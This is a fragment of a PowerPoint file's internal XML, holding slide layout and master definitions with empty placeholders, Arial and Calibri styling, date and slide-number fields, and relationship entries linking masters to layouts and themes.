            <a:lvl1pPr algn="l" defTabSz="806157" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr sz="1588">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{8F3BC4E6-8DB0-414E-AC59-11CEDB55D919}" type="datetimeFigureOut">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8778394" y="6377549"/>
            <a:ext cx="2803622" cy="249331"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr defTabSz="805466" eaLnBrk="0" hangingPunct="0">
              <a:defRPr sz="1588"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{36F63601-1352-4A85-A753-FC4E6FC2F118}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="306089437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276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="3840480"/>
            <a:ext cx="8534400" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{281B15C2-E832-483E-9E18-8D9384FC60B5}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{80182C42-CCF7-4351-ADF4-D0456FEBDA2D}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="99742547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935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1296940" y="2291605"/>
            <a:ext cx="9598121" cy="378709"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2382" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{45F859EB-D939-4DE2-91A6-708E9403D0C9}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{E8130B1F-F766-4B34-A865-3B3AFC5B6027}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="383191670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935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1577340"/>
            <a:ext cx="5303520" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6278880" y="1577340"/>
            <a:ext cx="5303520" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{C7DDD97C-39C4-4C66-9204-0D314A6CE0EF}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{F668647E-4129-432C-9687-377F35DEB822}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="372876494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a:xfrm>
            <a:off x="935184" y="717177"/>
            <a:ext cx="10321636" cy="692497"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4412" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{ACC25AFA-38C7-4710-90E5-16DDA1DF1030}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{7018090A-DD1C-4018-A7DC-A598D0980E22}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="222748749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4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr>
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{A1429382-45B6-43AB-8B6A-132FD28BD06B}" type="datetimeFigureOut">
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{52808BCB-FEB8-4FE5-97DD-D7FA9AD11183}" type="slidenum">
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40089683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20.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout19.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout18.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="../theme/theme2.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout22.xml"/><Relationship Id="rId4"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25.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theme" Target="../theme/theme3.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout27.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout26.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30.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout29.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout28.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="../theme/theme4.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout32.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout31.xml"/></Relationships>
</file>

<file path=ppt/slideMasters/_rels/slideMaster5.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout35.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout34.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout33.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="../theme/theme5.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout37.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout36.xml"/></Relationships>
</file>

<file path=ppt/slideMasters/_rels/slideMaster6.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout40.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout39.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout38.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="../theme/theme6.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout42.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout41.xml"/></Relationships>
</file>

<file path=ppt/slideMasters/_rels/slideMaster7.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout45.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout44.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout43.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="../theme/theme7.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout47.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout4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D0C24F76-100B-4CA1-853D-17669C90F9E6}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12-Dec-23</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>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56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="723660690"/>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hf hdr="0" ftr="0" dt="0"/>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Holder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="935182" y="717177"/>
            <a:ext cx="1032163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p>
            <a:pPr lvl="0"/>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Holder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1296940" y="2291603"/>
            <a:ext cx="9598121" cy="423193"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2750" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Holder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4144818" y="6377549"/>
            <a:ext cx="3902364" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
